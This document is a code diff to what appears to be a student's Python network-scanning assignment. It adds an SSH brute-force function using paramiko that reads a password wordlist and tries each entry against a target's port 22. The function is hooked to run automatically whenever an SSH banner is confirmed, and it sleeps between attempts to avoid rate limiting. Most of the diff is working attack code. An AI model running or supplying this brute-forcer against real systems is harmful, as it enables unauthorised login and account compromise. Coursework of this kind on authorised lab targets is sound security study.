@@ -6,6 +6,7 @@ from scapy.all import ICMP, IP, sr1, TCP
 import socket
 import requests
 import time
+from paramiko import SSHClient, AuthenticationException, AutoAddPolicy, SSHException
 
 # Question 2: Connectivity
 
@@ -94,6 +95,7 @@ def confirmSSH(target_ip): # Connect to port 22
         
         if banner.startswith("SSH-"):
             print(f"SSH service confirmed on {target_ip}:22")
+            bruteforceSSH(target_ip, args.username, args.password_list) # Question 7 addition
             print()
             return True
         else:
@@ -244,6 +246,64 @@ def bruteforceWeb(url, username, password_list_file):
 
 
 
+
+# Question 7: Bruteforce SSH
+
+def bruteforceSSH(target_ip, username, password_list):
+   
+    # Check if the password list file exists + read from
+    if not os.path.isfile(password_list):
+        print(f"[-] Password list file not found: {password_list}")
+        return
+    try:
+        with open(password_list, "r", encoding='utf-8', errors='ignore') as file:
+            passwords = file.read().splitlines()
+    except Exception as e:
+        print(f"[-] Error reading password file: {e}")
+        return
+    
+    print(f"[+] Starting SSH brute-force attack...")
+    
+    # SSH connection setup
+    client = SSHClient()
+    client.set_missing_host_key_policy(AutoAddPolicy()) 
+    
+    for password in passwords:
+        try:
+            print(f"[+] Trying password: {password}")
+            
+            # Connect to the SSH server
+            client.connect(target_ip, port=22, username=username, password=password, timeout=10) # Timeout high to avoid error
+            
+            # Authentication success
+            print(f"[+] Success! Username: {username}, Password: {password}")
+            return 
+        
+        except AuthenticationException:
+            # Authentication failed
+            print(f"[-] Authentication failed for password: {password}")
+        
+        except SSHException as e:
+            # General SSH error
+            print(f"[-] SSH error: {e}")
+            print("[!] Stopping attack due to SSH error.")
+            break  # Stop further attempts
+        
+        except socket.error as e:
+            # Connection error
+            print(f"[-] Connection error: {e}")
+            return
+        
+        finally:
+            # Close client
+            client.close()
+        
+        # Avoid rate-limiting
+        time.sleep(1)
+    
+    print("[-] Brute force attack completed. No valid credentials found.")
+
+    
 
 # Question 1: Argparse
 def main():
